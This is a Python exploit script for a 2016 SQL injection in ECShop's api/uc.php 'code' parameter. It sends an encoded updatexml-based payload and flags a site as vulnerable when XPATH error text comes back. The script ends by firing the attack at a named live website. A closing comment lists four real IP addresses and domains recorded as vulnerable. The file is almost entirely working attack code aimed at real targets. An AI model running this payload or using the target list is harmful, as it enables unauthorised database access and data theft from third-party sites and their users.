#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: ecshop uc.php参数code SQL注入
referer: http://www.wooyun.org/bugs/WooYun-2016-174468
author: Lucifer
description: 文件uc.php中,参数code存在SQL注入。
'''
import sys
import requests
import warnings
from termcolor import cprint

class Exploit:
    def attack(self, url):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/api/uc.php?code=6116diQV4NziG3G8ttFnwTYmEp60E3K27Q0fDWaey%2bTuNLsGKdb1%2b6bPFT%2fIjJEMPlzS5Tm3InnRZKczTQBFXzXmDD5bs4Il5pbFswzA9SWE4gqcbuN8LgLJlTQqvVeSRUfFn4dhgto6yjPsJp7Za6GJEQ"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"updatexml" in req.text and r"XPATH" in req.text:
                cprint("[+]存在ecshop uc.php参数code SQL注入漏洞...(高危)\tpayload: "+vulnurl, "red")
                return 'code SQL注入漏洞'

        except:
            return None

print(Exploit().attack('https://www.cs968.com.cn/'))

'''
http://117.39.62.62:81         ecshop_uc_code_sqli
https://114.215.171.86         ecshop_uc_code_sqli
http://124.205.250.26          ecshop_uc_code_sqli
http://mall.dysh.net           ecshop_uc_code_sqli

'''